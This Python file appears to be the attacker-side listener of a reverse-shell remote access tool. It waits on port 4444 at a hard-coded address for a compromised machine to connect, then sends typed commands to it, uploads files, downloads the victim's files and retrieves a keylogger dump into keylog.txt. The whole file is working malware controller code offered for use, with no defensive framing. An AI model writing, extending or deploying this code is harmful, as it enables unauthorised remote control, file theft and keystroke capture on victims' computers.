import socket
import json, base64


class Listener:

    def __init__(self, ip, port):

        #basic socket programming

        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.bind((ip, port))
        self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # to avoid OS error and reuse same port
        self.conn.listen(0)
        print("[+] listener started on {}:{} ".format(ip, port))
        self.connection, address = self.conn.accept()
        print("[+] connection  received from {} ".format(address))

    # to send data over a network

    def send(self, data):
        json_data = json.dumps(data)
        try:
            self.connection.send(json_data.encode())
        except BrokenPipeError:
            print("[-]Connection is broken")
            exit(0)

    # to send data over network

    def receive(self):
        json_result = ''
        while True:
            try:
                json_result += self.connection.recv(1024).decode()
                # getting bytes from the network and decoding to string
                result = base64.b64decode(json.loads(json_result).encode()).decode()
                #  string-> encode to pass them as byte to base64 option -> and again decode to display string from bytes
                return result
            except ValueError:
                continue

    # To provide path and download file from client
    def download_file(self, data, path):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(data))
            return "[+] File Downloaded !"

    # Method to upload
    def upload_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except Exception:
            return b"[-] File not found"

    # to continuous run the commands and obtain the results
    def run(self):

        while True:
            try:
                data = input(">>")
                if data.startswith('upload'):
                    content = self.upload_file(data.split(' ')[1])
                    data = data + ' ' + content.decode()
                self.send(data)
                result = self.receive()
                if data.startswith('download'):
                    result = self.download_file(result, data.split(' ')[1])
                if data.startswith('keyscan_dump'):
                    result = self.download_file(result,"keylog.txt")
                print(result)
            except KeyboardInterrupt:
                self.send("exit")
                exit(0)


# to create object of class and run

listener = Listener('192.168.100.32', 4444)  #change this
listener.run()
